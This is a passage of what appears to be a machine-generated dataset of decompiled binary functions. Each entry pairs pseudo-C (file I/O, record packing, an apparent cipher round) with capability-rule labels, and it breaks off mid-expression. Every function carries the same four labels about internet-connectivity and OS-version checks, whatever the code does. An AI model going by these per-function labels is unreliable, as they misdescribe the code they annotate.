        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0002ddd0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_14h = fcn.00035200(arg_14h);\n    if (var_14h == 0) {\n        fcn.00029970(7, 0, 0x21590004, arg_ch, arg_8h);\n    }\n    else {\n        var_4h = fcn.000236a0(0xfffffffe, 6, arg_10h, 0, var_14h, arg_14h, &arg_14h);\n        if (var_4h == 0) {\n            var_10h = 0xb1c59518;\n            var_20h = 0;\n            var_1ch = 0;\n            var_18h._0_1_ = 0;\n            var_28h = arg_8h;\n            var_2ch = arg_ch;\n            var_24h = 3;\n            var_8h = 0;\n            var_ch = 0;\n            fcn.00026da0(&var_10h, arg_ch, var_14h, arg_14h, &var_8h, &var_ch, &var_2ch);\n            fcn.00035330(var_14h);\n            fcn.00035330(var_8h);\n        }\n        else {\n            fcn.00029970(7, 0, var_4h + 0x191U | 0x21590000, arg_ch, arg_8h);\n            fcn.00035330(var_14h);\n        }\n    }\n    return;\n}\n",
        "token_count": 465
    },
    "0002df80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.0002df80(uint arg_8h, uint noname_1, uint arg_10h, uint *arg_14h, int32_t *arg_18h, uint32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t var_58h;\n    uint32_t var_54h;\n    uint32_t var_50h;\n    char var_49h;\n    uint32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint32_t var_24h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int16_t *var_8h;\n    int16_t *var_4h;\n    \n    var_54h = 0;\n    var_48h = 0;\n    var_3ch = 0;\n    var_58h = -1;\n    var_44h = 0;\n    *arg_14h = 1;\n    iVar1 = fcn.000205e0(arg_10h, 3, 4, &var_8h, 0);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    var_14h = 0;\n    var_10h = 0xffffffff;\n    var_49h = '\\0';\n    fcn.00020650(arg_10h, 7, 2, &var_14h, 4);\n    fcn.00020650(arg_10h, 8, 2, &var_10h, 4);\n    fcn.00020650(arg_10h, 0x15, 1, &var_49h, 1);\n    if ((*var_8h == 0x26) && (var_49h == '\\0')) {\n        var_8h = var_8h + 1;\n        var_49h = '\\x01';\n    }\n    if (arg_20h != 0) {\n        var_54h = 0x2000;\n        var_48h = 0x6000;\n        fcn.00020650(arg_10h, 10, 2, &var_54h, 4);\n        fcn.00020650(arg_10h, 0xb, 2, &var_48h, 4);\n        if ((var_48h == 0) || (var_48h < var_54h)) {\n            var_50h = 0x21590064;\n            goto code_r0x0002e356;\n        }\n    }\n    if (var_49h == '\\0') {\n        var_58h = fcn.00035960(var_8h, 0);\n        if (var_58h == -1) {\n            uVar2 = fcn.00035620();\n            return uVar2;\n        }\n        if ((var_14h != 0) && (iVar1 = fcn.00035cf0(var_58h, var_14h, 0),  iVar1 != var_14h)) {\n            var_50h = fcn.00035620();\n            goto code_r0x0002e356;\n        }\n        fcn.00035c20(var_58h, &var_38h);\n        var_3ch = var_24h;\n        var_40h = 0xffffffff;\n    }\n    else {\n        if (arg_20h != 0) {\n            return 0x21590001;\n        }\n        var_40h = fcn.00035f40(var_8h, &var_4h, 0);\n        if (*var_4h != 0) {\n            return 0x21590065;\n        }\n        var_ch = fcn.000290b0(3, var_40h, 0, 0, &var_3ch, 0);\n        if (var_ch != 0) {\n            return var_ch + 0x191U | 0x21590000;\n        }\n        var_58h = -1;\n    }\n    if (var_10h < var_3ch) {\n        var_3ch = var_10h;\n    }\n    if (arg_20h == 0) {\n        iVar1 = fcn.00035200(var_3ch);\n        *arg_18h = iVar1;\n        if (*arg_18h == 0) {\n            var_50h = 0x21590004;\n        }\n        else {\n            if (var_58h == -1) {\n                var_ch = fcn.000290b0(3, var_40h, *arg_18h, var_3ch, &var_3ch, 0);\n                if (var_ch != 0) {\n                    fcn.00035330(*arg_18h);\n                    *arg_18h = 0;\n                    var_50h = var_ch + 0x191U | 0x21590000;\n                    goto code_r0x0002e356;\n                }\n            }\n            else {\n                var_3ch = fcn.00035b50(var_58h, *arg_18h, var_3ch);\n                if (var_3ch < 0) {\n                    fcn.00035330(*arg_18h);\n                    *arg_18h = 0;\n                    var_50h = fcn.00035620();\n                    goto code_r0x0002e356;\n                }\n            }\n            *arg_1ch = var_3ch;\ncode_r0x0002e34f:\n            var_50h = 0;\n        }\n    }\n    else {\n        var_44h = fcn.00035200(var_48h);\n        if (var_44h == 0) {\n            var_50h = 0x21590004;\n        }\n        else {\n            var_3ch = fcn.00035490(var_3ch);\n            var_50h = fcn.00077b90(arg_8h, &var_3ch, 4, 0);\n            while (var_50h == 0) {\n                if (var_54h < var_48h) {\n                    uVar2 = fcn.000785f8();\n                    var_3ch = uVar2 % ((var_48h - var_54h) + 1) + var_54h;\n                }\n                else {\n                    uVar2 = fcn.000785f8();\n                    var_3ch = uVar2 % ((var_54h - var_48h) + 1) + var_48h;\n                }\n                var_3ch = fcn.00035b50(var_58h, var_44h, var_3ch);\n                if (var_3ch < 0) {\n                    var_50h = fcn.00035620();\n                    break;\n                }\n                if (var_3ch == 0) {\n                    var_50h = fcn.00077b90(arg_8h, 0, 0, 0);\n                    if (var_50h == 0) goto code_r0x0002e34f;\n                    break;\n                }\n                var_50h = fcn.00077b90(arg_8h, var_44h, var_3ch, 0);\n            }\n        }\n    }\ncode_r0x0002e356:\n    fcn.00035330(var_44h);\n    if (var_58h != -1) {\n        fcn.00035b40(var_58h);\n    }\n    return var_50h;\n}\n",
        "token_count": 1732
    },
    "0002e380": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl\nfcn.0002e380(uint arg_8h, uint noname_1, uint arg_10h, uint noname_3, uint noname_4, uint noname_5, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint arg_14h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_19h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int16_t *var_8h;\n    int16_t *var_4h;\n    \n    iVar1 = fcn.000205e0(arg_10h, 3, 4, &var_8h, 0);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    var_19h._0_1_ = '\\0';\n    fcn.00020650(arg_10h, 0x15, 1, &var_19h, 1);\n    if ((*var_8h == 0x26) && (var_19h == '\\0')) {\n        var_8h = var_8h + 1;\n        var_19h._0_1_ = '\\x01';\n    }\n    if (var_19h == '\\0') {\n        var_2ch = fcn.00035960(var_8h, 0x301);\n        if (var_2ch == -1) {\n            uVar2 = fcn.00035620();\n            return uVar2;\n        }\n        stack0xffffffe4 = 0xffffffff;\n    }\n    else {\n        if (arg_20h != 0) {\n            return 0x21590001;\n        }\n        *NULL = fcn.00035f40(var_8h, &var_4h, 0);\n        if (*var_4h != 0) {\n            return 0x21590065;\n        }\n        var_2ch = -1;\n    }\n    if (arg_20h == 0) {\n        iVar1 = fcn.000205e0(arg_10h, 4, 5, &var_20h, &var_14h);\n        if (iVar1 == 0) {\n            var_24h = 0x21590065;\n        }\n        else {\n            if (var_2ch == -1) {\n                var_ch = fcn.000292c0(3, stack0xffffffe4, var_20h, var_14h, 0, 1);\n                if (var_ch != 0) {\n                    return var_ch + 0x191U | 0x21590000;\n                }\n            }\n            else {\n                iVar1 = fcn.00035bc0(var_2ch, var_20h, var_14h);\n                if (iVar1 < 0) {\n                    var_24h = fcn.00035620();\n                    goto code_r0x0002e574;\n                }\n            }\ncode_r0x0002e56d:\n            var_24h = 0;\n        }\n    }\n    else {\n        arg_14h = fcn.00029470(400, 20000);\n        while (var_24h = fcn.00077b60(arg_8h, &var_20h, &var_10h, arg_14h, 0),  var_24h == 0) {\n            if (var_10h == 0) goto code_r0x0002e56d;\n            iVar1 = fcn.00035bc0(var_2ch, var_20h, var_10h);\n            if (iVar1 < 0) {\n                var_24h = fcn.00035620();\n                fcn.00077b30(arg_8h, var_20h, 0);\n                break;\n            }\n            fcn.00077b30(arg_8h, var_20h, 0);\n        }\n    }\ncode_r0x0002e574:\n    if (var_2ch != -1) {\n        fcn.00035b40(var_2ch);\n    }\n    return var_24h;\n}\n",
        "token_count": 969
    },
    "0002e590": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0002e590(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_55h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_10h;\n    uint32_t var_ch;\n    int16_t *var_8h;\n    int16_t *var_4h;\n    \n    iVar1 = fcn.000205e0(arg_10h, 3, 4, &var_8h, 0);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    var_55h._0_1_ = '\\0';\n    fcn.00020650(arg_10h, 0x15, 1, &var_55h, 1);\n    if ((*var_8h == 0x26) && (var_55h == '\\0')) {\n        var_8h = var_8h + 1;\n        var_55h._0_1_ = '\\x01';\n    }\n    if (var_55h == '\\0') {\n        iVar1 = fcn.00035d50(var_8h);\n        if (iVar1 < 0) {\n            uVar2 = fcn.00035620();\n            return uVar2;\n        }\n    }\n    else {\n        *NULL = fcn.00035f40(var_8h, &var_4h, 0);\n        if (*var_4h != 0) {\n            return 0x21590065;\n        }\n        var_ch = fcn.00029040(&var_10h);\n        if (var_ch != 0) {\n            return var_ch;\n        }\n        var_ch = fcn.000235a0(var_10h, 3, &var_55h + 1, &var_50h);\n        if (var_ch != 0) {\n            return var_ch + 0x191 | 0x21590000;\n        }\n        iVar1 = fcn.000236f0(var_10h, 3, var_4ch);\n        if (iVar1 != 0) {\n            return iVar1 + 0x191U | 0x21590000;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 532
    },
    "0002e6b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0002e6b0(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t var_34h;\n    uint32_t var_30h;\n    uint var_2ch;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    int32_t *var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    *arg_14h = 3;\n    var_ch = 0;\n    var_8h = 0;\n    var_14h = 2;\n    var_10h = &var_2ch;\n    var_2ch = 6;\n    uStack44 = 2;\n    uStack40 = 7;\n    uStack36 = 4;\n    var_34h = fcn.00034830(5, &var_4h);\n    if (var_34h == 0) {\n        var_30h = 0;\n        for (var_1ch = var_4h; var_30h = var_30h + 1,  *var_1ch != 0; var_1ch = var_1ch + *var_1ch) {\n        }\n        var_ch = var_30h;\n        var_8h = fcn.000352f0(var_30h, 4);\n        if (var_8h == 0) {\n            var_34h = 0x21590004;\n        }\n        else {\n            var_1ch = var_4h;\n            for (var_18h = 0; var_18h < var_30h; var_18h = var_18h + 1) {\n                uVar1 = fcn.00035200(var_14h * 0x10 + 2 + *(var_1ch + 0xe));\n                *(var_8h + var_18h * 4) = uVar1;\n                if (*(var_8h + var_18h * 4) == 0) {\n                    var_34h = 0x21590004;\n                    goto code_r0x0002e8bf;\n                }\n                fcn.00078790(*(var_8h + var_18h * 4), 0, var_14h << 4);\n                *(*(var_8h + var_18h * 4) + 4) = *(var_8h + var_18h * 4) + 8;\n                **(var_8h + var_18h * 4) = 4;\n                **(*(var_8h + var_18h * 4) + 4) = var_1ch[0x11];\n                *(*(var_8h + var_18h * 4) + 0x14) = *(var_8h + var_18h * 4) + 0x20;\n                *(*(var_8h + var_18h * 4) + 0x10) = *(var_1ch + 0xe) + 2;\n                fcn.0007877e(*(*(var_8h + var_18h * 4) + 0x14), var_1ch[0xf], *(var_1ch + 0xe));\n                *(*(var_1ch + 0xe) + *(*(var_8h + var_18h * 4) + 0x14)) = 0;\n                var_1ch = var_1ch + *var_1ch;\n            }\n            var_34h = fcn.0002ee00(&var_14h, arg_18h, arg_1ch);\n        }\n    }\ncode_r0x0002e8bf:\n    if (var_8h != 0) {\n        for (var_18h = 0; var_18h < var_ch; var_18h = var_18h + 1) {\n            fcn.00035330(*(var_8h + var_18h * 4));\n        }\n    }\n    fcn.00035330(var_8h);\n    fcn.00035330(var_4h);\n    return var_34h;\n}\n",
        "token_count": 1008
    },
    "0002e930": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0002e930(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00020650(arg_10h, 2, 2, &var_10h, 4);\n    if (iVar1 == 0) {\n        var_ch = 0x21590065;\n    }\n    else {\n        var_8h = var_10h;\n        var_4h = 0;\n        var_2ch = 0;\n        var_28h = 0;\n        var_24h = 0;\n        var_20h = 0;\n        var_1ch = 0;\n        var_18h = 0;\n        var_ch = fcn.0001d190(&var_14h, 1, &var_2ch, &var_8h);\n        if (var_ch == 0) {\n            var_ch = fcn.0001d200(var_14h, 0);\n            fcn.00078544(var_14h);\n        }\n        else {\n            var_ch = fcn.000785b6(var_ch);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 349
    },
    "0002e9c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0002e9c0(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    uint var_280h;\n    uint var_278h;\n    int16_t *var_274h;\n    uint var_270h;\n    uint var_268h;\n    uint *var_264h;\n    uint var_260h;\n    uint var_258h;\n    int16_t *var_254h;\n    uint var_250h;\n    uint var_248h;\n    uint *var_244h;\n    uint var_23ch;\n    uint *var_238h;\n    int16_t *var_234h;\n    uint var_230h;\n    uint *var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint *var_21ch;\n    int32_t var_1f0h;\n    uint *var_1ech;\n    int32_t var_1e0h;\n    uint var_1dch;\n    char *var_1d0h;\n    uint *var_1cch;\n    int32_t var_1c0h;\n    int32_t var_1bch;\n    int32_t var_1b0h;\n    uint var_1ach;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_18ch;\n    uint32_t var_188h;\n    int32_t var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint *var_150h;\n    uint var_14ch;\n    int32_t var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_78h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    *arg_14h = 3;\n    fcn.00078790(&var_228h, 0, 0x38);\n    var_22ch = &var_140h;\n    var_230h._0_2_ = 0;\n    var_230h._2_2_ = 200;\n    var_224h = 0x24;\n    var_220h = 0xb1be16dc;\n    var_21ch = &var_230h;\n    var_148h = fcn.00078670(2, 0xb1be16f8, &var_228h, 0, 0);\n    if (var_148h != 0) {\n        var_234h = 0xb1be173c;\n        var_238h = &var_140h;\n        do {\n            iVar2 = *var_234h;\n            *var_238h = iVar2;\n            var_234h = var_234h + 1;\n            var_238h = var_238h + 2;\n        } while (iVar2 != 0);\n    }\n    var_18ch = 0;\n    var_14ch = 0;\n    var_144h = 0;\n    var_188h = 0;\n    var_184h = 0;\n    fcn.00078676(&var_18ch, &var_14ch, &var_144h, &var_188h);\n    var_10h = 6;\n    var_ch = &var_180h;\n    var_150h = &var_1f0h;\n    var_8h = 1;\n    var_4h = &var_150h;\n    var_180h = 9;\n    var_17ch = 4;\n    var_1ech = &var_140h;\n    var_244h = &var_140h;\n    do {\n        iVar2 = *var_244h;\n        var_244h = var_244h + 2;\n    } while (iVar2 != 0);\n    var_1f0h = (var_244h - (&var_140h + 2) >> 1) * 2 + 2;\n    var_178h = 10;\n    var_174h = 4;\n    var_1dch = 0xb1be1744;\n    var_254h = 0xb1be1744;\n    piVar3 = var_254h;\n    do {\n        var_254h = piVar3;\n        piVar3 = var_254h + 1;\n    } while (*var_254h != 0);\n    var_1e0h = (var_254h + 0x2720f45e >> 1) * 2 + 2;\n    var_170h = 0xb;\n    var_16ch = 200;\n    fcn.0007865e(&var_78h, 0xb1be1750, var_18ch, var_14ch, var_144h);\n    var_1cch = &var_78h;\n    var_264h = &var_78h;\n    do {\n        cVar1 = *var_264h;\n        var_264h = var_264h + 1;\n    } while (cVar1 != '\\0');\n    var_1d0h = var_264h + (1 - (&var_78h + 1));\n    var_168h = 0xc;\n    var_164h = 4;\n    if (var_184h == 0) {\n        var_1bch = -0x4e41e89c;\n        var_1c0h = 2;\n    }\n    else {\n        var_1bch = var_184h;\n        var_1c0h = (var_188h & 0xffff) + 2;\n    }\n    var_160h = 0xd;\n    var_15ch = 4;\n    var_1ach = 0xb1be1768;\n    var_274h = 0xb1be1768;\n    piVar3 = var_274h;\n    do {\n        var_274h = piVar3;\n        piVar3 = var_274h + 1;\n    } while (*var_274h != 0);\n    var_1b0h = (var_274h + 0x2720f44c >> 1) * 2 + 2;\n    var_158h = 0x88;\n    var_154h = 4;\n    var_19ch = 0xb1c58b50;\n    var_1a0h = 0x1e;\n    fcn.0002ee00(&var_10h, arg_18h, arg_1ch);\n    return;\n}\n",
        "token_count": 1605
    },
    "0002ee00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0002ee00(uint32_t *arg_8h, uint32_t **arg_ch, int32_t *arg_10h)\n\n{\n    uint32_t *arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    for (var_8h = 0; var_8h < arg_8h[2]; var_8h = var_8h + 1) {\n        for (var_1ch = 0; var_1ch < *arg_8h; var_1ch = var_1ch + 1) {\n            if (*(arg_8h[1] + 4 + var_1ch * 8) == 200) {\n                var_10h = var_10h + 4 + *(*(arg_8h[3] + var_8h * 4) + var_1ch * 0x10) * 2;\n            }\n            else {\n                var_10h = var_10h + 4 + *(*(arg_8h[3] + var_8h * 4) + var_1ch * 0x10);\n            }\n        }\n    }\n    arg_8h_00 = fcn.00035200(*arg_8h * 0x11 + 0x14 + var_10h);\n    if (arg_8h_00 == NULL) {\n        uVar1 = 0x21590004;\n    }\n    else {\n        *arg_8h_00 = 0;\n        arg_8h_00[1] = 0;\n        arg_8h_00[2] = 0;\n        arg_8h_00[3] = 0;\n        arg_8h_00[4] = 0;\n        *arg_8h_00 = *arg_8h;\n        arg_8h_00[1] = arg_8h[2];\n        fcn.00068fc0(arg_8h_00);\n        puVar3 = arg_8h_00 + 5;\n        fcn.00078790(puVar3, 0, *arg_8h * 0x11);\n        for (var_8h = 0; var_8h < *arg_8h; var_8h = var_8h + 1) {\n            *(puVar3 + var_8h * 0x11) = *(arg_8h[1] + var_8h * 8);\n            *(arg_8h_00 + var_8h * 0x11 + 0x18) = *(arg_8h[1] + 4 + var_8h * 8);\n            if ((*(arg_8h_00 + var_8h * 0x11 + 0x18) == -0x38) || (*(arg_8h_00 + var_8h * 0x11 + 0x18) == -0x37)) {\n                *(arg_8h_00 + var_8h * 0x11 + 0x18) = 4;\n            }\n            fcn.0002ede0(var_8h * 0x11 + puVar3);\n        }\n        var_ch = *arg_8h * 0x11 + 0x14;\n        for (var_8h = 0; var_8h < arg_8h[2]; var_8h = var_8h + 1) {\n            for (var_1ch = 0; var_1ch < *arg_8h; var_1ch = var_1ch + 1) {\n                if (*(arg_8h[1] + 4 + var_1ch * 8) == 200) {\n                    if ((*(var_1ch * 0x10 + *(arg_8h[3] + var_8h * 4)) == 0) ||\n                       (*(*(arg_8h[3] + var_8h * 4) + 4 + var_1ch * 0x10) == 0)) {\n                        *(arg_8h_00 + var_ch) = 0;\n                        var_ch = var_ch + 4;\n                    }\n                    else {\n                        iVar2 = fcn.000374c0(*(*(arg_8h[3] + var_8h * 4) + 4 + var_1ch * 0x10));\n                        uVar1 = fcn.00035490(iVar2 * 2);\n                        *(arg_8h_00 + var_ch) = uVar1;\n                        fcn.00037370(*(*(arg_8h[3] + var_8h * 4) + 4 + var_1ch * 0x10), arg_8h_00 + var_ch + 4, \n                                     0xffffffff);\n                        var_ch = var_ch + 4 + iVar2 * 2;\n                    }\n                }\n                else {\n                    uVar1 = fcn.00035490(*(*(arg_8h[3] + var_8h * 4) + var_1ch * 0x10));\n                    *(arg_8h_00 + var_ch) = uVar1;\n                    fcn.0007877e(arg_8h_00 + var_ch + 4, *(*(arg_8h[3] + var_8h * 4) + 4 + var_1ch * 0x10), \n                                 *(*(arg_8h[3] + var_8h * 4) + var_1ch * 0x10));\n                    fcn.000206c0(*(arg_8h[1] + 4 + var_1ch * 8));\n                    var_ch = var_ch + 4 + *(*(arg_8h[3] + var_8h * 4) + var_1ch * 0x10);\n                }\n            }\n        }\n        *arg_ch = arg_8h_00;\n        *arg_10h = *arg_8h * 0x11 + 0x14 + var_10h;\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 1467
    },
    "0002f1f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0002f1f0(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t *arg_8h_00;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = NULL;\n    while( true ) {\n        if (arg_ch < 0x15) {\n            return var_1ch;\n        }\n        var_18h = *arg_8h;\n        var_14h = arg_8h[1];\n        var_10h = arg_8h[2];\n        var_ch = arg_8h[3];\n        var_8h = arg_8h[4];\n        var_4h._0_1_ = *(arg_8h + 5);\n        fcn.00068fc0(&var_18h);\n        if (arg_ch - 0x15 < var_14h) break;\n        puVar1 = fcn.00035200(0x1c);\n        if (puVar1 == NULL) {\n            return var_1ch;\n        }\n        *puVar1 = 0;\n        puVar1[1] = 0;\n        puVar1[2] = 0;\n        puVar1[3] = 0;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        puVar1[1] = var_18h;\n        puVar1[2] = var_10h & 0xff;\n        puVar1[3] = var_14h;\n        if (puVar1[3] < 8) {\n            puVar1[4] = puVar1 + 5;\n        }\n        else {\n            uVar2 = fcn.00035200(puVar1[3]);\n            puVar1[4] = uVar2;\n            if (puVar1[4] == 0) {\n                puVar1[3] = 0;\n            }\n        }\n        fcn.0007877e(puVar1[4], arg_8h + 0x15, var_14h);\n        arg_8h = arg_8h + 0x15 + var_14h;\n        arg_ch = (arg_ch - 0x15) - var_14h;\n        arg_8h_00 = puVar1[2];\n        iVar3 = fcn.000206c0(arg_8h_00);\n        if (iVar3 == 0) {\n            arg_8h_00[3] = 0;\n        }\n        *arg_8h_00 = var_1ch;\n        var_1ch = arg_8h_00;\n    }\n    return var_1ch;\n}\n",
        "token_count": 710
    },
    "0002f350": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002f350(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    uVar1 = *arg_ch + arg_8h[1];\n    uVar1 = uVar1 << (arg_ch[1] & 0x1f) | uVar1 >> (0x20U - arg_ch[1] & 0x1f);\n    var_8h = ((*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) ^ *((uVar1 & 0xff) * 4 + -0x4e420620)) -\n             *((uVar1 >> 0x18) * 4 + -0x4e420220)) + *((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ *arg_8h;\n    uVar1 = arg_ch[2] ^ var_8h;\n    uVar1 = uVar1 << (arg_ch[3] & 0x1f) | uVar1 >> (0x20U - arg_ch[3] & 0x1f);\n    var_ch = (*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) - *((uVar1 & 0xff) * 4 + -0x4e420620)) +\n             *((uVar1 >> 0x18) * 4 + -0x4e420220) ^ *((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ arg_8h[1];\n    uVar1 = arg_ch[4] - var_ch;\n    uVar1 = uVar1 << (arg_ch[5] & 0x1f) | uVar1 >> (0x20U - arg_ch[5] & 0x1f);\n    var_8h = (*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) + *((uVar1 & 0xff) * 4 + -0x4e420620) ^\n             *((uVar1 >> 0x18) * 4 + -0x4e420220)) - *((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_8h;\n    uVar1 = arg_ch[6] + var_8h;\n    uVar1 = uVar1 << (arg_ch[7] & 0x1f) | uVar1 >> (0x20U - arg_ch[7] & 0x1f);\n    var_ch = ((*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) ^ *((uVar1 & 0xff) * 4 + -0x4e420620)) -\n             *((uVar1 >> 0x18) * 4 + -0x4e420220)) + 